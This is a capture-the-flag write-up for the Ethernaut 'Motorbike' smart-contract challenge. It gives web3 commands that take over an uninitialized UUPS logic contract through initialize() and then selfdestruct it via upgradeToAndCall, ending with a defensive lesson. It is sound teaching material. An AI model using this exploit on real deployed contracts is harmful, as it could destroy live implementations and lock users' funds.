# Motorbike

# Problem Statement
```
Ethernaut's motorbike has a brand new upgradeable engine design.

Would you be able to selfdestruct its engine and make the motorbike unusable ?

Things that might help:
- EIP-1967
- UUPS upgradeable pattern
- Initializable contract
```

# Solution

NOTES
The key thing to keep in mind here is that any storage variables defined in the logic contract `Engine` is actually stored in the proxy's (`Motorbike`) storage. Proxy is the storage layer here which only delegates the logic to logic/implementation contract (logic layer).
Flow looks like this:
```
send transaction -> proxy/storage contract -> logic contract
```
The attack vector is the ability to call the logic contract `Engine`'s `initialize()` method to set your EOA as the `upgrader`. From there you can call `upgradeToAndCall()` to point to your contract with the `selfdestruct`.<br>
Note that the `selfdestruct` will happen in the context of the `Engine` as `delegatecall` is used.
The upgrading of contracts is the responsibility of the logic contract `Engine` as the proxy `MoterBike` does not have that capability.
Thus, when the `selfdestruct` happens `Moterbike` will be useless as the `_IMPLEMENTATION_SLOT` is pointing to a `selfdestruct`ed contract and it has no way of changing/upgrading it do a new logic contract.

So lets implement this. First, get the address of the logic contract `Engine`:
```
let logicAddress = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
// '0x0000000000000000000000007c56450c6fbcd100aaad8b4838dfce3908e90baf'
```
Recall that every storage slot is 32 bytes and `address`es are 20 bytes. So lets grab the address:
```
logicAddress = '0x' + logicAddress.slice(-40) // '0x7c56450c6fbcd100aaad8b4838dfce3908e90baf'
```
Set the `upgrader` to be your EOA address:
```
const initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")
await web3.eth.sendTransaction({ from: player, to: logicAddress, data: initializeData })
```
Check that `upgrader` is your address:
```
const upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()")
await web3.eth.call({from: player, to: logicAddress, data: upgraderData})
// '0x000000000000000000000000YOUR_EOA_ADDRESS'
```
Next, deploy the `MoterbikeBomb` contract.
After it is deployed run the `Engine`'s `upgradeToAndCall` method to refer to this new `MoterbikeBomb` contract:
```
const bombAddress = "0xYOUR_BOMB_ADDRESS";
const explodeData = web3.eth.abi.encodeFunctionSignature("explode()")
const upgradeFunction = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}
const upgradeParams = [bombAddress, explodeData]
const upgradeData = web3.eth.abi.encodeFunctionCall(upgradeFunction, upgradeParams)
await web3.eth.sendTransaction({from: player, to: logicAddress, data: upgradeData})
```
We've completed this lesson!

# Key Learnings
- Never leave logic/implementation contracts uninitialized.
